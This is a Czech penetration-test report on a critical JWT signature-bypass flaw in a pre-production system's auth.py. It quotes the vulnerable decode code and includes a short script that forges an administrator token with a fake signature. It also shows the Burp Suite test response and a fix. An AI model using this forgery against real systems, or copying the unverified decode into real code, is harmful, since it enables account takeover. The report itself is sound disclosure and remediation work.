# Zpráva o bezpečnostní zranitelnosti
## Obcházení ověření podpisu JWT

| Pole | Hodnota |
|---|---|
| **Závažnost** | Kritická |
| **CWE** | CWE-347 — Nesprávné ověření kryptografického podpisu |
| **Postižená komponenta** | `auth.py` — funkce `authorize_user()` |
| **Systém** | UOIS (předprodukční prostředí) |
| **Datum** | 11. 6. 2026 |
| **Testoval** | Filip Janšta |

---

## 1. Shrnutí

V předprodukční aplikaci UOIS byla identifikována kritická zranitelnost umožňující obejití autentizace. Server **přijímá jakýkoliv JWT token bez ohledu na jeho kryptografický podpis**, což útočníkovi umožňuje vytvořit falešný token obsahující identifikátor libovolného uživatele — včetně administrátorských účtů — a získat plný autentizovaný přístup bez platných přihlašovacích údajů.

---

## 2. Popis zranitelnosti

Zranitelnost se nachází v souboru `auth.py` ve funkci `authorize_user()`. Volání pro dekódování JWT explicitně vypíná ověření podpisu:

```python
decoded_token = jwt.decode(
    authorization_cookie,
    options={"verify_signature": False}   # ← ověření podpisu je vypnuto
)
user_id = decoded_token.get("user_id")
```

Nastavením `verify_signature: False` je knihovně PyJWT sděleno, aby přeskočila veškerou kryptografickou validaci tokenu. V důsledku toho:

- Server přijímá tokeny s **jakýmkoliv podpisem**, včetně vymyšlených nebo prázdných.
- Server **nevynucuje platnost tokenu** (pole `exp`), protože ověření expirace je součástí procesu validace podpisu.
- Jakákoliv identita uživatele uložená v poli `user_id` v těle tokenu je **přijata bez podmínek**.

Sekundárním problémem je prázdný blok `except:`, který tiše zachytí všechny výjimky — včetně `SystemExit` a `KeyboardInterrupt` — čímž se chyby autentizace stávají neviditelné při ladění i reakci na incidenty.

```python
except:                          # ← zachytí vše včetně systémových výjimek
    print("Token decode error")
```

---

## 3. Důkaz existence zranitelnosti

### 3.1 Skript pro vytvoření falešného tokenu

Následující skript (`hd_16_exploit_script.py`) demonstruje, že je možné sestavit strukturálně platný JWT s libovolným `user_id` (zde: účet cílového administrátora) a zcela vymyšleným podpisem:

```python
import base64, json

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',',':')))
payload = b64url(json.dumps({
    "user_id": "51d101a0-81f1-44ca-8366-6cf51432e8d6",
    "name": "Test",
    "roles": ["administrátor"],
    "exp": 9999999999
}, separators=(',',':')))
sig = "FORGED_SIGNATURE"

print(f"{header}.{payload}.{sig}")
```

Skript vytvoří token ve formátu `<hlavička>.<tělo>.FORGED_SIGNATURE`. Část s podpisem je zcela vymyšlená a jakýkoliv správně nakonfigurovaný server by ji odmítl.

### 3.2 Test v nástroji Burp Suite

Falešný token byl odeslán na adresu `https://uois/index` prostřednictvím **Burp Suite Community** modulu Repeater, přičemž cookie `authorization` byla nahrazena výstupem výše uvedeného skriptu. Odpověď serveru byla:

```
HTTP/2 307 Temporary Redirect
Date: Thu, 11 Jun 2026 08:37:23 GMT
Content-Length: 0
Location: https://uois/index/
```

Server provádějící správnou validaci JWT by na token s neplatným podpisem odpověděl stavovým kódem `401 Unauthorized` s chybovým hlášením. Absence jakékoliv chybové odpovědi `4xx` — v kombinaci s bezpodmínečným `verify_signature: False` ve zdrojovém kódu — potvrzuje, že server podpis v žádném okamžiku nevyhodnotil. Přesměrování 307 je způsobeno chybějící směrovací cookie (`session_id`), nikoliv odmítnutím podpisu.

**Tato odpověď v kombinaci se statickou analýzou zdrojového kódu v sekci 2 představuje důkaz, že zranitelnost je zneužitelná.**

---

## 4. Scénář útoku (konceptuální popis)

Útočník znající `user_id` cílového uživatele (získatelné například z odpovědí API, chybových hlášení nebo enumerace) může provést úplné převzetí účtu následujícím způsobem:

1. **Získání cílového OID** — zjistit `user_id` privilegovaného účtu prostřednictvím libovolného úniku informací.
2. **Vytvoření falešného JWT** — sestavit token s cílovým `user_id` a libovolnou hodnotou pole `roles`. Tajný klíč není potřeba; server přijme jakýkoliv řetězec jako podpis.
3. **Odeslání falešného tokenu** — nastavit vymyšlený JWT jako cookie `authorization` v HTTP požadavku na aplikaci.
4. **Získání přístupu** — server načte `user_id` z těla tokenu bez ověření a útočníka přihlásí jako cílového uživatele.

Protože není ověřována ani expirace, jsou stejnou měrou přijímány dříve zachycené tokeny i tokeny s libovolně nastaveným datem platnosti (`"exp": 9999999999`).

---

## 5. Nápravná opatření

Stávající volání `jwt.decode` je nutné nahradit verzí, která předává správný tajný nebo veřejný klíč a specifikuje očekávaný algoritmus. Pro integraci s Entra ID (Azure AD) by měl být veřejný klíč dynamicky načítán z JWKS endpointu Microsoftu.

```python
from jwt.exceptions import PyJWTError, ExpiredSignatureError
import os

SECRET_KEY = os.environ["JWT_SECRET"]   # nikdy nezapisovat přímo do kódu; pro Entra ID použít JWKS klienta
ALGORITHM  = "RS256"                    # asymetrický algoritmus vhodný pro Entra ID

def authorize_user(request: Request):
    cookie = request.cookies.get("authorization")
    if not cookie:
        return None
    try:
        # Podpis, expirace i pole tokenu jsou automaticky ověřovány
        decoded = jwt.decode(cookie, SECRET_KEY, algorithms=[ALGORITHM])
        return decoded.get("user_id")
    except ExpiredSignatureError:
        print("Platnost tokenu vypršela.")
    except PyJWTError as e:
        print(f"Chyba validace JWT: {e}")
    except Exception as e:
        print(f"Neočekávaná chyba při autorizaci: {e}")
    return None
```

Přehled provedených změn:

| Změna | Důvod |
|---|---|
| Odstraněno `verify_signature: False` | Obnovuje kryptografické ověření podpisu |
| Přidán `SECRET_KEY` a `algorithms` | Zajišťuje přijetí pouze tokenů podepsaných důvěryhodným vydavatelem |
| Nahrazen prázdný `except:` bloky `ExpiredSignatureError` a `PyJWTError` | Přesně zachytává chyby JWT; systémové výjimky se šíří standardně |
| Tajný klíč načítán z proměnné prostředí | Zamezuje úniku přihlašovacích údajů ve zdrojovém kódu |

---

## 6. Reference

- [CWE-347: Nesprávné ověření kryptografického podpisu](https://cwe.mitre.org/data/definitions/347.html)
- [Dokumentace PyJWT — Dekódování tokenů](https://pyjwt.readthedocs.io/en/stable/usage.html)
- [PortSwigger Web Security Academy — Útoky na JWT](https://portswigger.net/web-security/jwt)
- [RFC 7519 — JSON Web Token](https://datatracker.ietf.org/doc/html/rfc7519)
